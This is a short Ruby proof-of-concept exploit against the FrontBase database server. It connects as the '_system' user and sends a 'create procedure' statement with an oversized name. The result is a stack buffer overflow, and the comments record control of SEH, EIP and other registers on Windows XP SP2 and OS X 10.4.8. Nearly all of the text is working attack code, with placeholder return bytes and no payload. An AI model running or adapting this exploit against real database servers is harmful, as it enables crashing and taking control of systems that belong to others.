 #!/usr/bin/ruby

 require "frontbase"

 connection = FBSQL_Connect.connect("192.168.0.6", -1, "newDB",
 "_system", "", "", "")
 # Windows XP Sp2 - SEH hit.
 b00m = 'create procedure "' + 'A'*3115 + "\x01\x02\x03\x04" + '"() ' +
 'begin ' + 'end;'

 # Windows XP Sp2 - EIP hit and control of data at ESP.
 # b00m = 'create procedure "' + 'A'*255 + "ABCD" +
 "\x01\x02\x03\x04\x05\x06\x07" + '"() '  + 'begin ' + 'end;'

 # OSX 10.4.8 control of EAX and ESI in frame 0, control of EAX EBP ESI
 and EIP in frame 1
 # b00m = 'create procedure "' + 'A'*291 + "0123" + "ABCD" + '"() '  +
 'begin ' + 'end;'   # OSX  - x86

 connection.exec(b00m)

